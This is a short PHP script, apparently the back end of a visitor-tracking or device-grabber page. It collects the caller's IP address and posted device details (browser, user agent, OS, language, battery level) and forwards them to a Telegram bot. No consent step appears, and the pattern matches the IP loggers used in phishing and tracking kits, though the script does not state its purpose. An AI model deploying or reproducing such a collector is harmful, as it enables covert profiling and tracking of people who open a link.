<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$navegador = $_POST['navegador'] ?? 'Unknown';
$user_agent = $_POST['user_agent'] ?? 'Unknown';
$version_app = $_POST['version_app'] ?? 'Unknown';
$sistema = $_POST['sistema'] ?? 'Unknown';
$idioma = $_POST['idioma'] ?? 'Unknown';
$bateria = $_POST['bateria'] ?? 'Unknown';

$ts = gmdate('c');

$msg = "📱 <b>Info del dispositivo</b>\n".
       "📌 IP: $ip\n".
       "🖥 Navegador: $navegador\n".
       "🧩 User-Agent: $user_agent\n".
       "💻 Versión App: $version_app\n".
       "🖲 Sistema: $sistema\n".
       "🌐 Idioma: $idioma\n".
       "🔋 Batería: $bateria%\n".
       "⏰ Hora: $ts";

send_to_telegram($msg);

// Retornar JSON opcional
echo json_encode(['status' => 'ok']);
